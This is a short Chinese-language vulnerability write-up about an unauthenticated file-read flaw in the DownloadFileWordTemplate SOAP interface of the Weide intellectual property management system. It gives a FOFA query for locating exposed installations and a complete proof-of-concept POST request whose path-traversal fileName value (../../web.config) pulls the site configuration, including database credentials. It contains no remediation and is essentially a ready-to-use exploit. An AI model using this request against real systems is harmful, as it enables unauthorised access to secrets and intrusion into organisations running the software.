# 唯徳知识产权管理系统DownloadFileWordTemplate接口存在文件读取漏洞

唯徳知识产权管理系统 DownloadFileWordTemplate 接口存在文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```javascript
body="JSCOMM/language.js"
```

## poc

```javascript
POST /AutoUpdate/WSFM.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: length
SOAPAction: "http://tempuri.org/DownloadFileWordTemplate"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <DownloadFileWordTemplate xmlns="http://tempuri.org/">
      <fileName>../../web.config</fileName>
    </DownloadFileWordTemplate>
  </soap:Body>
</soap:Envelope>
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409141639464.png)